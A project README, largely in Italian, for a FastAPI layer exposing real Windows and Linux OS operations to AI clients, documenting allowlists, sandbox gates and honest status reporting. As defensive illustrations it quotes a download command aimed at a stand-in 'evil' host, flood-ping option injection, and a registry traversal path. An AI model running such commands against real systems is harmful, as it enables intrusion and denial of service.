# WinOs-Layer — Windows OS API Layer + Universal Adapter

Piattaforma **FastAPI** (non un simulatore React) che espone il sistema operativo come OS API e trasforma applicazioni in **Virtual API** tramite Universal Adapter.

Layers: `OS Layer → Automation Engine → Universal Adapter → Virtual API → AI/MCP`

## Dual platform backends

| Backend | When | Behavior |
|---------|------|----------|
| **WindowsBackend** | Win32 (`WINOS_BACKEND=auto` or `windows`) | Real Windows processes, FS, registry, Win32 UI |
| **LinuxBackend** | Linux (`WINOS_BACKEND=auto` or `linux`) | **Real** Linux via psutil/subprocess/pathlib — not a simulator |
| **FakeBackend** | Explicit `WINOS_BACKEND=fake` only | Deterministic Contoso CRM fixtures for adapter E2E / CI |

`WINOS_BACKEND=auto` → **windows on win32**, **linux on Linux**. Fake is never the default on Linux.
Requesting `windows` on Linux raises unless `WINOS_ALLOW_FAKE_FALLBACK=true`.

## Features

- FastAPI + OpenAPI (`/docs`), bind default **127.0.0.1**, remote access **DISABLED**
- Security: API keys, RBAC, permissions, audit log, rate limiting
- Real OS ops on each platform; FakeBackend for CRM adapter demos
- Universal Adapter (UI tree on Fake / **real Windows UIA** / Linux AT-SPI with find/click/set-text)
- MCP JSON-RPC server, WebSocket event bus, Control Center HTML
- Roadmap PR #1–#50 with `docs/FORENSIC_AUDIT.md`

## Layout

```
windows_os_api/     # Python package
  core/             # runtime, security, permissions, events
  os/               # system, processes, filesystem, windows, ...
  apps/             # discovery, adapters, workflows, agent, ...
  api/              # rest, websocket, mcp
  backends/         # linux.py, windows.py, fake.py, factory.py
  control_center/   # HTML dashboard
tests/              # unit, integration, e2e, linux/, windows/
docs/FORENSIC_AUDIT.md
scripts/forensic_audit.py
scripts/live_linux_smoke.py
scripts/live_windows_smoke.py
.github/workflows/
```

## Install

```bash
python -m venv .venv
# Windows: .venv\Scripts\activate
source .venv/bin/activate
pip install -e ".[dev]"
# On Windows also: pip install -e ".[dev,windows]"
```

## Run server

```bash
# Linux: real LinuxBackend by default (auto)
export WINOS_BACKEND=auto          # or linux
# For Contoso CRM adapter demos only:
# export WINOS_BACKEND=fake
export WINOS_API_KEYS='["dev-key-change-me"]'
winos-api serve --host 127.0.0.1 --port 8765
# or: python -m windows_os_api.cli.main serve
```

Open:
- API docs: http://127.0.0.1:8765/docs
- Control Center: http://127.0.0.1:8765/
- Header: `X-API-Key: dev-key-change-me`

`POST /v1/processes` on LinuxBackend **actually starts** binaries (real PIDs via psutil).


## Linux optional packages

```bash
# Screenshots + vision template OCR (Pillow/mss already in deps)
# Accurate OCR (optional):
sudo apt install tesseract-ocr
pip install pytesseract

# Audio (PulseAudio or PipeWire):
sudo apt install pulseaudio-utils     # provides pactl
# or: sudo apt install pipewire-utils  # provides wpctl

# Wayland input / window tools (compositor-dependent):
#   ydotool or wtype or dotool   — typing / clicks
#   wlrctl / swaymsg / hyprctl   — window list (wlroots/Sway/Hyprland)

# AT-SPI UI tree:
sudo apt install python3-pyatspi at-spi2-core

# X11 (still supported; auto-selected when XDG_SESSION_TYPE=x11):
sudo apt install wmctrl xdotool xclip

# Geometria/stato finestre (move/resize/minimize/maximize):
#   xdotool   — muove e ridimensiona
#   wmctrl    — massimizza (atomi EWMH)
#   x11-utils — xprop, che RILEGGE lo stato per confermarlo
sudo apt install xdotool wmctrl x11-utils
```

### Capability honesty (Linux)

`GET /v1/capabilities` `feature_flags` include: `ocr`, `ocr_tesseract`, `wayland`, `x11`,
`audio`, `services`, `vision`, `privileged` (always false — elevation is gated).

| Flag | Meaning |
|------|---------|
| `ocr` / `vision` | Pillow template matcher always; tesseract when installed |
| `wayland` | Session is Wayland; window/input tools may still be missing |
| `privileged` | Never open — needs `ADMIN` + `WINOS_ALLOW_PRIVILEGED=true` |
| `windows_uia` | Always false on Linux |

Vision OCR accuracy is best-effort without tesseract. Wayland window control varies by compositor.


## Optional AI providers (Windows + Linux)

Same config surface on both platforms. Default is **local** (Pillow / tesseract OCR) — no API key required.

| Env / setting | Values | Notes |
|---------------|--------|-------|
| `WINOS_AI_PROVIDER` | `local` \| `openai` \| `anthropic` \| `openrouter` | default `local` |
| `WINOS_AI_API_KEY` | secret | never logged in full; masked as `sk-…xxxx` in API |
| `WINOS_AI_MODEL` | optional | defaults per provider |
| `WINOS_AI_BASE_URL` | optional | OpenRouter / custom OpenAI-compatible |

Persist via Control Center **AI Provider** section or:

```bash
# Admin API key required
curl -s -X PUT http://127.0.0.1:8765/v1/ai/settings \
  -H "X-API-Key: admin-key-change-me" \
  -H "Content-Type: application/json" \
  -d '{"provider":"openai","api_key":"sk-YOUR_KEY_HERE","model":"gpt-4o-mini"}'

curl -s http://127.0.0.1:8765/v1/ai/settings -H "X-API-Key: admin-key-change-me"
curl -s -X POST http://127.0.0.1:8765/v1/ai/test \
  -H "X-API-Key: admin-key-change-me" -H "Content-Type: application/json" \
  -d '{"spend":false}'
```

Settings file: `~/.config/winos-api/ai_settings.json` (Linux) or `%APPDATA%\\winos-api\\ai_settings.json` (Windows), mode `0600`. Empty `api_key` on PUT clears the secret. Never commit real keys — use placeholders like `sk-YOUR_KEY_HERE`.

When `provider != local` and a key is set, vision/find and UI reasoner/planner may call the remote chat API; otherwise the existing local path is unchanged.

## Tests

```bash
# Fake / portable suite (CRM fixtures)
export WINOS_BACKEND=fake
pytest -q -m "not windows and not linux"

# Real LinuxBackend hard tests — need a reachable X display
export WINOS_BACKEND=linux
pytest -q -m linux

# Everything except Windows-only (must stay green on Linux CI)
pytest -q -m "not windows"

# Headless machine (CI, container, ssh without X)? Wrap with Xvfb, otherwise
# screenshot capture fails with "Cannot connect to display":
xvfb-run -a --server-args="-screen 0 1280x1024x24" pytest -q -m linux

# Live Linux smoke (real sleep/jq PID via API)
python scripts/live_linux_smoke.py
```

### Windows hard tests (win32 only)

```bash
# On a real Windows machine / GHA windows-latest:
pip install -e ".[dev,windows]"   # pywin32, comtypes, uiautomation, mss, Pillow
# Optional UIA fallback: pip install pywinauto
export WINOS_BACKEND=windows      # PowerShell: $env:WINOS_BACKEND="windows"

# Headless-capable hard tests (process/FS/registry/SendInput structures)
pytest -q -m windows

# UI Automation / screenshot tests need an interactive desktop
pytest -q -m "windows and requires_display"

# Live smoke (Notepad + tree + type + screenshot; skips UI if session 0)
python scripts/live_windows_smoke.py
```

On Linux, `pytest -m windows` collects import/smoke tests; runtime Win32 tests skip with clear reasons.
Without a real Windows **interactive desktop**, UIA tree / mouse click / screenshot may skip (`requires_display`); process, FS, registry, clipboard, and SendInput API calls still run.

## ComputerAgent — puo' eseguire, ma solo dietro un gate dichiarato

`POST /v1/workflows/agent` e il tool MCP `agent_run` pianificano e, **quando un
gate esplicito lo autorizza**, eseguono.

```
execute_intent → plan → workflow
      ↓
confidence >= 0.8   AND   risk == low   AND   sandbox policy = ALLOW (ogni step)
      ↓
invoke_action → sandbox → backend → audit
```

Se una qualunque condizione manca, la risposta e' `status: "planned"` e il campo
`did_not_execute_because` **nomina quale**: `CONFIDENCE_BELOW_THRESHOLD`,
`RISK_NOT_LOW`, `CONFIRMATION_REQUIRED`, `DENIED_BY_POLICY`, `NO_STEPS_TO_EXECUTE`.
Un `False` secco lascerebbe il chiamante a indovinare fra «incerto», «rischioso»
e «la policy ha detto no» — tre situazioni con tre risposte diverse.

**Il gate non e' il confine di sicurezza.** L'enforcement del sandbox sta dentro
`invoke_action`: il gate decide se *tentare*, l'enforcement decide se *avviene*.
C'e' un test che forza il gate a dire «esegui» su un piano negato dalla policy e
dimostra che l'azione viene comunque rifiutata — una risposta sbagliata del
livello AI costa l'accuratezza del report, mai la sicurezza.

> **Nota onesta sullo stato attuale.** Con il generator di oggi nessun workflow
> soddisfa insieme `confidence >= 0.8` e `risk == low`: l'unico ramo ad alta
> confidenza assegna `risk = "medium"`, e creare un cliente *e'* un'azione a
> rischio medio. E' una proprieta' del generator, non del gate. La soglia non e'
> stata abbassata per «far succedere» l'esecuzione.

### `app_id` si dice sempre — non ha piu' un default

`app_id` risponde alla domanda «su QUALE applicazione»: nessuna azione di questo
livello ha senso senza. Aveva come default `"contoso-crm"` — il CRM demo del
backend fake — su sette punti di ingresso, fra cui i body REST, il tool MCP
`agent_run` e `ComputerAgent`. Chi non diceva su quale app agire non riceveva un
errore: riceveva la app demo, e la richiesta **andava a buon fine** contro quella.
Sul backend fake e' una risposta sbagliata; puntato a un desktop vero e' una
richiesta applicata a qualunque applicazione risponda a quel nome.

Ora il campo e' obbligatorio ovunque:

| Superficie | Se manca | Se e' vuoto (`""` / `"   "`) |
|---|---|---|
| REST (`/v1/intent`, `/v1/agent/run`, `/v1/workflows/generate`, `/v1/plan`, `/v1/workflows/record/start`) | `422`, con `app_id` nominato | `422` |
| MCP `agent_run` | errore JSON-RPC `missing required argument(s): app_id` | `422`-equivalente: `AppIdRejected` |
| `ComputerAgent(app_id)`, `execute_intent`, `plan`, `generate_workflow`, `discover_actions` | `TypeError` (parametro obbligatorio) | `AppIdRejected` |

Le due meta' servono a cose diverse e servono entrambe: *obbligatorio* copre la
chiave assente, *non vuoto* copre `""` — lo stesso errore scritto in un altro
modo, che un parametro obbligatorio da solo lascerebbe passare. Il controllo del
vuoto sta in `apps/adapters/validation.py` ed e' applicato in `create_adapter`,
il punto che **agisce**, non nelle route: un controllo che il chiamante puo'
dimenticare non e' un controllo — stessa ragione per cui l'enforcement del
sandbox sta dentro `invoke_action`.

`backends/fake.py` continua a nominare `contoso-crm`: e' la fixture che
*definisce* quella app demo. Un test fallisce se il nome ricompare come default
in un qualunque altro modulo di produzione.

## Finestre — focus e chiusura: `ok` significa «e' successo davvero»

`POST /v1/windows/{hwnd}/focus` e `DELETE /v1/windows/{hwnd}`.

**Breaking change.** Prima entrambi eseguivano il comando con `check=False` e
rispondevano `{"ok": true}` qualunque cosa fosse successo — **anche per una
finestra che non esisteva**. Adesso rileggono l'effetto:

- `focus_window` verifica con `xdotool getactivewindow` (Linux) o
  `GetForegroundWindow` (Windows). `ok` significa che la finestra **ha** il
  focus adesso, e la risposta porta `active_window` con quella che ce l'ha
  davvero.
- `close_window` **attende** che la finestra sparisca, con un timeout. Chiudere
  e' una *richiesta*: un'applicazione con un documento non salvato ha il
  diritto di mostrare «salvare le modifiche?» e restare aperta.

> Chiude una **finestra**, non un'applicazione: un programma con altre finestre
> aperte continua a girare.

### `error_code` — accanto a `error`, non al suo posto

| Codice | Significato |
|---|---|
| `WINDOW_NOT_FOUND` | L'handle non nomina una finestra: non l'ha mai fatto, o la finestra e' sparita — anche *durante* la chiamata |
| `WINDOW_STILL_OPEN` | Chiusura richiesta e accettata, finestra ancora li' (dialogo di conferma, documento non salvato) |
| `FOCUS_NOT_GRANTED` | L'attivazione e' andata a buon fine e il focus ce l'ha un'altra finestra |
| `TOOL_UNAVAILABLE` | Manca `wmctrl`/`xdotool` o `win32gui` — si risolve nella lista pacchetti, non nel codice |

`error` resta una stringa leggibile: chi la legge oggi continua a funzionare.
Distinguere «non trovata» da «ancora aperta» facendo match sul testo inglese si
rompe alla prima riformulazione, ed e' per questo che c'e' il codice.

**Perche' non basta il codice d'uscita.** Misurato su una finestra il cui
processo era gia' stato ucciso:

```
xdotool windowclose <finestra morta>  ->  exit 1
wmctrl -i -c        <finestra morta>  ->  exit 0     <- dichiara successo
```

E' la stessa bugia che `wmctrl -b add,maximized_vert` raccontava in #18. Su
Windows il problema e' diverso ma equivalente: `PostMessage(WM_CLOSE)` e'
**asincrona** e ritorna appena il messaggio e' in coda, quindi «e' ritornata
senza errori» non ha mai significato «la finestra si e' chiusa».

## Finestre — la richiesta non e' il risultato

`POST /v1/windows/{hwnd}/move|resize|minimize|maximize|restore` restituiscono la
geometria che l'OS riporta **dopo** l'operazione, riletta da `xdotool
getwindowgeometry` su Linux e da `GetWindowRect` su Windows.

```bash
curl -X POST localhost:8000/v1/windows/12345/move \
  -H "X-API-Key: $KEY" -d '{"x":300,"y":200}'
# {"ok":true,"requested":{"x":300,"y":200},
#  "geometry":{"x":302,"y":240,"width":700,"height":498}, ...}
```

`requested` e `geometry` sono due campi distinti di proposito. Un window manager
puo' rifiutare, spostare o quantizzare cio' che gli si chiede: misurato sotto
Xvfb+openbox, uno spostamento a (300,200) atterra a (302,240) per l'offset della
cornice, e un resize a 700x500 torna 700x498 perche' xterm si aggancia alle
celle di carattere. Un'API che rispondesse con la richiesta invece che col
risultato direbbe una cosa falsa su ogni piattaforma reale.

**`ok` significa «l'effetto e' stato osservato», non «il comando e' uscito 0».**
La differenza e' misurabile: `wmctrl -i -r 99999999 -b add,maximized_vert` esce
**0** per un id di finestra che non esiste.

`verified` dice se la conferma e' davvero avvenuta. Su Linux minimize e maximize
si confermano con `xprop` (pacchetto `x11-utils`); su Windows con
`GetWindowPlacement`. Se quella lettura non riesce, la risposta riporta
`"verified": false` **e il motivo nell'errore**, invece di affermare un esito che
non ha potuto verificare — uno `state: null` accanto a `verified: true` sarebbe
la peggiore delle due cose: nessuna informazione, presentata come conferma.

Valori accettati: coordinate in `-32768..32767`, dimensioni in `1..32767` — il
range a 16 bit della geometria X11. Fuori range si rifiuta, **non si clampa**:
restituire una finestra di una dimensione che non e' stata chiesta, dichiarando
successo, sarebbe reinterpretare la richiesta invece che rispondere.

## Network — route, DNS, ping

```bash
curl localhost:8000/v1/network/routes -H "X-API-Key: $KEY"
curl -X POST localhost:8000/v1/network/dns/resolve -H "X-API-Key: $KEY" -d '{"host":"localhost"}'
curl -X POST localhost:8000/v1/network/ping        -H "X-API-Key: $KEY" -d '{"host":"127.0.0.1","count":2}'
```

`resolve`, `reverse` e `ping` sono **POST**, non GET: raggiungono la rete su un
nome fornito dal chiamante, quindi non sono safe né idempotenti nel senso HTTP e
non devono essere messi in cache o precaricati da nulla nel mezzo.

**Route senza binari.** Su Linux si leggono da `/proc/net/route`, non da
`ip route`: iproute2 non c'e' su ogni sistema, e una lista vuota si leggerebbe
come «nessuna route» quando in realta' significa «nessun tool». Su Windows si
parsa `route print -4`. Il campo `gateway` e' normalizzato: dove Windows scrive
`On-link`, l'API risponde `0.0.0.0`, come Linux — cosi' chi legge non ha bisogno
di un ramo per piattaforma.

**DNS senza subprocess.** `socket.getaddrinfo`, in **un solo** modulo condiviso
dai backend: e' la stessa chiamata su Linux e Windows, e tre copie potrebbero
solo divergere. Niente `nslookup` o `dig`: aggiungerebbero una dipendenza da un
binario e passerebbero una stringa del chiamante a una riga di comando, senza
alcun vantaggio.

### `ping` e l'option injection

`ping` e' il primo endpoint che consegna una stringa del chiamante a un
programma esterno. Gira come argv con `shell=False`, quindi **non** c'e'
injection di shell — ma argv da solo non basta:

```
ping -f            flood ping
ping -c 1000000    una sonda che non si ferma
ping -t            (Windows) ping infinito
```

Un hostname non puo' cominciare con `-`, quindi rifiutare quella forma elimina
la classe intera. In piu': `count` 1..10 e `timeout` 1..10 secondi, **rifiutati
se fuori range, non clampati** — una sonda che gira piu' a lungo di quanto
chiesto non e' un favore.

`ok` significa «almeno una risposta e' tornata»; `received` dice **quante**,
perche' «1 su 4» e' una risposta diversa da «tutte» e il chiamante non deve
tirare a indovinare quale ha ricevuto. Se il binario manca, la risposta lo dice
(`available: false`) invece di far sembrare l'host irraggiungibile: mandare un
operatore a guardare la rete quando il problema e' un pacchetto non installato
e' la peggiore diagnosi possibile.

## Input — cosa significa `ok` per un click

`POST /v1/input/mouse/{move,click,double-click,scroll,drag}` e
`/v1/input/keyboard/{key,type,down,up,hotkey}`.

A differenza della geometria delle finestre, **un tasto non ha rilettura**: una
volta che l'evento e' consegnato all'OS appartiene alla finestra che ha il
focus, e nessuno riporta cosa ne ha fatto. Quindi `ok` qui significa la cosa
piu' stretta e vera — **l'OS ha accettato l'evento** — verificata sul codice
d'uscita dello strumento (Linux) o sul conteggio restituito da `SendInput`
(Windows), non data per scontata. La consegna vera e' dimostrata nei test, che
la rileggono da `xev`.

**Il puntatore e' l'eccezione**: si rilegge, quindi `mouse_move` e `mouse_drag`
verificano dove e' finito e restituiscono `position` accanto a `requested`.

```bash
curl -X POST localhost:8000/v1/input/keyboard/hotkey \
  -H "X-API-Key: $KEY" -d '{"keys":["ctrl","a"]}'
# {"ok":true,"keys":["ctrl","a"],"chord":"ctrl+a", ...}
```

`hotkey` prende una **lista**, non `"ctrl+a"`: accettare la stringa vorrebbe
dire indovinare il separatore, e un tasto il cui nome lo contiene diventerebbe
in silenzio due tasti.

**Breaking change**: un nome di pulsante sconosciuto ora viene **rifiutato**.
Prima la mappatura era `{"left": "1", ...}.get(button, "1")`, quindi
`mouse_click(x, y, "rihgt")` eseguiva un click **sinistro** e rispondeva
`{"ok": true, "button": "rihgt"}` — il nome chiesto, accanto a un'azione che era
un'altra. Riportare un'azione che non si e' compiuta e' peggio che rifiutarne
una che non si puo' compiere.

Limiti: scroll `1..100` notch, chord fino a 8 tasti, drag `1..200` step. Fuori
range si rifiuta, non si clampa.

> **Nota per chi testa su Linux headless.** Senza un window manager,
> `xdotool mousemove` e' un **no-op silenzioso**: il puntatore resta al centro
> dello schermo. Prima `mouse_move` rispondeva comunque `{"ok": true}`; ora
> rilegge la posizione e lo dice. Se stai automatizzando sotto Xvfb, fai girare
> un WM (es. `openbox`), o nessun input del mouse arrivera' da nessuna parte.

## Inventario di sistema — servizi, volumi, stampanti

`GET /v1/services`, `GET /v1/devices` e `GET /v1/printers` leggono il sistema
vero su entrambe le piattaforme. Prima su Windows erano stub, e il primo dei tre
era il peggiore:

```python
def list_services(self):  return [{"name": "WinOsApi", "status": "unknown", ...}]
def list_printers(self):  return []
def list_devices(self):   return []
```

`WinOsApi` **non esiste**. Una lista vuota e' poco informativa; una riga
inventata e' una risposta su cui il chiamante agisce e sbaglia. Ora:

| Endpoint | Windows | Linux |
|---|---|---|
| `/v1/services` | Service Control Manager (`OpenSCManager` + `EnumServicesStatus`) | `systemctl` (user + system) |
| `/v1/devices` | volumi via `GetLogicalDriveStrings` + `GetDriveType` | `/sys/block` |
| `/v1/printers` | spooler via `EnumPrinters` + `GetDefaultPrinter` | `lpstat -a` |

L'enumerazione dei servizi richiede solo `SC_MANAGER_ENUMERATE_SERVICE`, che un
utente normale ha: nessun servizio viene aperto, avviato o fermato.

**`list_devices` significa dispositivi a blocchi, su tutti e due gli OS.** Su
Windows sono i volumi, non i dispositivi PnP: far significare allo stesso
endpoint «dischi» su un OS e «tutto cio' che ha un driver» sull'altro sarebbe un
difetto peggiore della lista vuota che sostituisce, perche' nessun client
potrebbe essere scritto una volta sola. Entrambi marcano `type: "block"`.

Gli stati dei servizi condividono un vocabolario (`running`, `stopped`,
`starting`, ...): il SCM parla in numeri, systemd in parole, e la tabella di
traduzione esiste perche' il chiamante non debba conoscerne nessuna delle due.
Un codice non mappato resta `state_<n>` invece di diventare `unknown` — un
numero si puo' cercare nella documentazione, la parola «unknown» no.

### `status` dice solo cio' che e' stato misurato

Su Linux ogni riga di `/v1/devices` usciva con `"status": "ok"`: un giudizio di
salute che nulla aveva controllato. Una voce in `/sys/block` sostiene una sola
affermazione — che il dispositivo e' presente — e quella e' cio' che la riga
dice adesso (`"status": "present"`). `media` viene letto da `removable`, un file
che il kernel mantiene davvero, e vale `"unknown"` se non si riesce a leggerlo:
dedurre `"fixed"` da un errore di lettura sarebbe inventare.

E' la stessa classe di difetto di `ok: true` su una finestra inesistente e di
`state: null` presentato come `verified: true`. Un campo che dice sempre la
stessa cosa non e' un'informazione: e' rumore che sembra un'informazione.

### `supported` — «nessuno» e «non ho guardato» sono risposte diverse

`GET /v1/printers` rispondeva `{"printers": []}` in **quattro** situazioni, e il
chiamante non poteva distinguerle: non ci sono stampanti / il backend non le
implementa / la discovery non e' stata eseguita / la discovery e' fallita. Una
sola delle quattro e' la risposta che credeva di leggere.

Decisione owner D3-A: il contratto e' **additivo** — la chiave dei dati resta
dov'era, accanto compaiono `supported` e, quando serve, `error_code`.

| Situazione | Risposta |
|---|---|
| supportata, con risultati | `{"supported": true, "printers": [...]}` |
| supportata, nessun elemento | `{"supported": true, "printers": []}` |
| il backend non la implementa | `{"supported": false, "printers": [], "error_code": "CAPABILITY_NOT_SUPPORTED"}` |
| implementata, ma qui manca lo strumento | `{"supported": false, "printers": [], "error_code": "CAPABILITY_UNAVAILABLE"}` |
| supportata, discovery fallita | `{"supported": true, "printers": [], "error_code": "DISCOVERY_FAILED"}` |

Gli ultimi due codici di «non supportata» sembrano lo stesso caso e non lo sono,
ed e' la distinzione che rende il campo utile:

```
Windows + audio    -> NOT_SUPPORTED   servirebbe pycaw nel progetto (D4-B):
                                      installare qualcosa non cambia niente
Linux   + printers -> UNAVAILABLE     lpstat non c'e' su QUESTA macchina:
                                      installare CUPS le fa comparire
```

Un codice solo per entrambi direbbe al chiamante di arrendersi anche quando
basta un pacchetto. Il backend dichiara in `NOT_IMPLEMENTED` cio' che non
implementa affatto; tutto il resto che risulta `false` e' implementato ma privo
dello strumento.

**`DISCOVERY_FAILED` esiste perche' i backend adesso lo dicono.** Prima
inghiottivano i propri errori e restituivano `[]`: un `lpstat` in timeout
diventava «non ci sono stampanti». Ora sollevano `DiscoveryFailed`, e il caso e'
raggiungibile davvero — altrimenti sarebbe testabile solo iniettando il
fallimento nel modulo che lo gestisce, cioe' testando il test.

`GET /v1/audio/volume` segue la stessa regola con un valore singolo:
`{"volume": null}` diceva «il volume e' nullo», che e' diverso da «non so
leggerlo qui».

> **Audio su Windows: `supported: false`, dichiarato** (decisione owner D4-B).
> Richiederebbe Core Audio COM via `pycaw`, una dipendenza nuova, e diventera'
> una PR dedicata quando servira'. Nel frattempo l'API lo dice invece di
> rispondere `200` con lista vuota — che su qualunque PC significherebbe
> «questa macchina non ha audio», ed e' falso.

## Servizi — allowlist esplicita, default-deny

`POST /v1/services/{name}` controlla **solo i servizi scritti in
`WINOS_SERVICE_ALLOWLIST`**. La variabile non impostata significa insieme vuoto,
cioe' **nessun servizio controllabile**.

```
control_service
      |
   allowlist
      |
servizio autorizzato?
   |-- SI  -> systemctl
   \-- NO  -> 403, e systemctl non viene mai invocato
```

```bash
WINOS_SERVICE_ALLOWLIST=nginx,postgres   # esattamente questi due
```

Cosa c'era prima: `control_service` sanificava il nome dell'unit — niente
metacaratteri di shell, niente path traversal — e poi lo passava a `systemctl`.
Quella sanificazione impedisce di **iniettare** un comando, non di **fermare il
servizio sbagliato**: `ssh`, `firewalld`, `systemd-journald` sono tutti nomi di
unit perfettamente validi. L'unica difesa erano i permessi di systemd, cioe'
qualcosa che sta fuori da questo programma e che, se il processo gira da root,
non c'e'.

**Nomi esatti, niente glob.** `nginx` autorizza `nginx`, non `nginx-proxy`. Un
`nginx*` scritto nella variabile autorizza il servizio letteralmente chiamato
`nginx*`, cioe' nessuno: i glob sono il modo in cui un'allowlist diventa
permissiva senza che nessuno se ne accorga. `nginx` e `nginx.service` sono lo
stesso servizio.

**ADMIN non e' una scorciatoia.** L'allowlist e' controllata prima e
indipendentemente dal ruolo: una chiave amministrativa che chiede un servizio
non autorizzato riceve lo stesso 403 di chiunque altro. Se ADMIN bastasse,
l'allowlist sarebbe un suggerimento e non un confine.

**Il rifiuto avviene prima del sistema.** Un servizio non autorizzato non
«fallisce dopo aver provato»: non raggiunge mai `systemctl`. C'e' un test che lo
verifica spiando `subprocess.run` e asserendo che non e' stato chiamato — non
guardando il valore di ritorno, che sarebbe uguale nei due casi.

### Su Windows il controllo dei servizi e' dichiaratamente non implementato

Decisione owner D5-B. `POST /v1/services/{name}` su Windows risponde **501**:

```
"non ti e' permesso"   ->  403, allowlist   ->  puoi chiedere l'autorizzazione
"non so farlo"         ->  501, capability  ->  non c'e' niente da chiedere
```

Rispondeva `{"ok": false, "error": "service control requires elevated pywin32"}`
— **incondizionatamente**. Il messaggio sembra un problema di permessi
risolvibile elevando il processo; non lo era, perche' la chiamata non tentava
nulla, nemmeno da amministratore. Un errore che sembra un'implementazione
funzionante e' peggio di nessuna implementazione: chi lo legge cerca la causa
dalla parte sbagliata, e l'allowlist gattava una porta che non si apre.

**Elencare i servizi e controllarli sono due capability distinte**, con due
flag: su Windows `services` e' `true` (l'enumerazione funziona davvero) e
`service_control` e' `false`. Un flag solo direbbe «servizi: si'» e lascerebbe
credere che anche start/stop vada.

La capability e' controllata **prima** dell'allowlist: su un backend che non
implementa il controllo, «non e' in allowlist» suggerirebbe che aggiungendolo
funzionerebbe. Autorizzare il servizio non cambia la risposta, e c'e' un test
che lo verifica.

Su Linux `service_control` segue la presenza di `systemctl`: implementato, e se
lo strumento manca e' `CAPABILITY_UNAVAILABLE` (installabile), non
`CAPABILITY_NOT_SUPPORTED`.

> Quando servira', il controllo servizi su Windows sara' una PR dedicata:
> allowlist → privilege gate → `OpenSCManager` → `ControlService` → verifica →
> audit, testata su un servizio **creato dal test stesso** — mai fermando un
> servizio del runner.

### `/v1/services` non inventa righe

`list_services` restituiva due servizi che non esistono: uno chiamato
`"systemctl"` quando il binario mancava, e uno chiamato `"none"` quando non
c'erano unit. Sono spariti (stessa famiglia del `WinOsApi` tolto su Windows), e
il contratto `supported` li rende superflui.

E **systemd irraggiungibile non e' «nessun servizio»**: in un container il
binario `systemctl` c'e' ma il bus no, e prima l'API rispondeva `200` con lista
vuota — cioe' affermava che la macchina non ha servizi. Ora e'
`DISCOVERY_FAILED` con il motivo. Uno scope che fallisce da solo (`--user` senza
sessione) non annulla l'altro: si annota e si prosegue.

## Registro — allowlist di prefissi, aree critiche mai

`PUT /v1/registry` scrive **solo sotto i prefissi autorizzati**.

```
default:  HKCU\Software\
estende:  WINOS_REGISTRY_ALLOWLIST=HKCU\Software\MyApp\,HKCU\Company\
mai:      HKLM\SYSTEM\   HKLM\SECURITY\   HKLM\SAM\
```

Le tre aree vietate **non si riaprono per configurazione**: scriverle nella
variabile d'ambiente non le autorizza, la voce viene scartata. Richiedono una
policy specifica e separata — se bastasse aggiungerle all'allowlist, quella
policy separata non esisterebbe. `HKLM\SYSTEM\CurrentControlSet\` e' a un errore
di battitura da una macchina che non riavvia.

**La scrittura su Windows adesso avviene davvero.** Era uno stub che rispondeva
sempre `{"ok": false, "error": "registry write requires elevation"}` —
incondizionatamente, senza mai tentare, nemmeno sotto `HKCU` dove nessuna
elevazione serve. Un errore sempre uguale non dice niente sul perche', e un gate
davanti a una porta che non si apre sarebbe teatro. Il valore viene **riletto**
dopo la scrittura: `ok: true` significa «c'e' scritto quello», non «la chiamata
non ha sollevato».

### I tre modi in cui un gate di prefissi si buca

Hanno un test ciascuno, perche' sono errori che si fanno una volta sola e si
scoprono tardi:

| Trappola | Esempio | Difesa |
|---|---|---|
| prefisso senza separatore | `HKCU\Software` autorizzerebbe `HKCU\SoftwareAltro` | ogni prefisso finisce con `\` |
| alias della hive | `HKEY_LOCAL_MACHINE\SYSTEM\` vs `HKLM\SYSTEM\` | hive canonicalizzata prima del confronto |
| traversal | `HKCU\Software\..\..\SYSTEM` | i segmenti `..` sono **rifiutati**, non risolti |

I `..` non si risolvono di proposito: risolverli vorrebbe dire indovinare cosa
intendeva il chiamante, e un gate non indovina.

**Il confronto e' case-insensitive, il percorso scritto no.** Il gate decide,
non riscrive la richiesta: restituire la chiave di confronto (maiuscola)
sposterebbe la scrittura su una chiave diversa da quella chiesta, perche' gli
store di `FakeBackend` e `LinuxBackend` sono dizionari e per un dizionario
`Software` e `SOFTWARE` sono due chiavi.

**ADMIN non e' una scorciatoia**, come per i servizi: l'allowlist e' controllata
prima e indipendentemente dal ruolo.

> **Nota di scope.** `GET /v1/registry` (lettura) **non** passa da questa
> allowlist: la decisione D2-B riguarda la scrittura, e leggere e' una classe di
> rischio diversa. Non e' stata estesa di iniziativa dell'agente.

## Terminal — allowlist, non denylist

`POST /v1/terminal/execute` esegue **solo comandi registrati**, come argv e con
`shell=False`. Non c'e' una shell in cui iniettare.

```bash
python -c "from windows_os_api.os.terminal.allowlist import registered_commands; print(registered_commands(include_admin=True))"
```

Il registro sta in `windows_os_api/os/terminal/allowlist.py`: ogni voce dichiara
numero massimo di argomenti, un pattern che ogni argomento deve rispettare, e se
richiede la policy ADMIN. Estenderlo e' una modifica di codice, di proposito —
una chiave di configurazione che allarga a runtime un confine di sicurezza
riporta l'allowlist a essere un allow-anything.

`ADMIN` amplia il registro, non lo disattiva.

Il comando viene tokenizzato con le regole di quoting dell'host: `posix=False`
su Windows, dove `\` e' un separatore di path, non un escape. Sotto le regole
POSIX `C:\` viene letto come escape rotto e il chiamante si sente dire che il
suo quoting e' sbagliato, invece della verita': il comando non e' registrato.
Cambia il messaggio d'errore, non l'insieme dei comandi permessi — cio' che non
sta nel registro non viene eseguito su nessuna piattaforma.

**Breaking change rispetto alla versione precedente**: prima il comando veniva
filtrato con una denylist di metacaratteri (`; && | ` `` ` `` ` $( \n`) e poi
eseguito con `shell=True`. Un comando senza quei caratteri passava e veniva
eseguito: `curl http://evil/x -o /tmp/x` non ne contiene nessuno. Chi oggi passa
comandi arbitrari a questo endpoint deve registrarli.

## Forensic audit

```bash
python scripts/forensic_audit.py
```

Fails if any `DONE` claim in `docs/forensic_audit.json` lacks files/tests.

## MCP

```bash
winos-mcp   # stdio JSON-RPC
# or: python -m windows_os_api.api.mcp.server
```

## Two builds — choose your OS

| Platform | GitHub Actions | Artifact | Notes |
|----------|----------------|----------|-------|
| **Linux portable** | **Build Linux** → `dist-linux-portable` | `winos-api-portable-linux.zip` | FastAPI server ELF with **LinuxBackend** (real OS). Fake optional. **Not a Windows emulator.** |
| **Windows EXE/Setup** | **Build** → `dist-windows` | Setup.exe + `winos-api-portable-windows.zip` | **WindowsBackend** on Win32 |
| **Release** | tag `v*` | both attached | exe, windows zip, linux zip, checksums |

## Installer / packaging

```bash
python scripts/build_installer.py validate
python scripts/build_installer.py build-portable
python scripts/build_installer.py package-linux
